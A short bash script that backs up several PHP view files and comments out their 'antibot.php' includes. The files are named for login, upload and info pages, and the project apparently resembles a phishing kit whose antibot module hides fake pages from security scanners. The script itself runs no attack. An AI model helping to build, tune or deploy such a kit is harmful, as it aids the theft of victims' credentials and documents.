#!/bin/bash

# Script to disable antibot system in all view files
echo "Disabling antibot system in view files..."

# List of files to update
files=(
    "views/uploadz2.php"
    "views/infoz.php"
    "views/uploadz3.php"
    "views/done.php"
    "views/uploadz.php"
    "views/loginz2.php"
)

# Update each file
for file in "${files[@]}"; do
    if [ -f "$file" ]; then
        echo "Updating $file..."
        # Create backup
        cp "$file" "$file.backup"
        
        # Comment out antibot includes
        sed -i 's/^include.*antibot\.php/\/\/ ANTIBOT DISABLED - include..antibot.php/' "$file"
        
        echo "Updated $file"
    else
        echo "File $file not found, skipping..."
    fi
done

echo "Antibot system disabled in all view files!"
echo "Backups created with .backup extension"
